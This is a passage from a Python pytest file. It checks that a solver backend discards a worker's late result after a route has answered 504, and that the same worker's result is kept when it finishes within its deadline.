    assert done.wait(30.0)


@pytest.mark.parametrize("route", ["/solve", "/export"])
def test_a_result_after_the_504_does_not_land(
    _export_solves: None, route: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The worker outlives its request (#762). When it converges after the
    route answered 504, its state must not become the continuation seed: the
    user was told that solve failed."""
    done = threading.Event()
    monkeypatch.setattr(backend, "_solve_sync", _slow_then_real(0.5, done))
    monkeypatch.setattr(backend, "_hard_timeout", lambda timeout: 0.1)
    r = _post(route, _pipe(timeout=20.0))
    assert r.status_code == 504
    assert done.wait(30.0), "the worker never finished"
    assert backend._continuation_state is None
    assert request(app, "GET", "/solver/continuation_available").json() == {"available": False}
    assert not backend._live_tokens  # the route gave its token up

    # Control: the same slow worker inside its deadline does land.
    done.clear()
    monkeypatch.setattr(backend, "_hard_timeout", lambda timeout: None)
    r = _post(route, _pipe(timeout=20.0))
    assert r.status_code == 200
    assert backend._continuation_state is not None
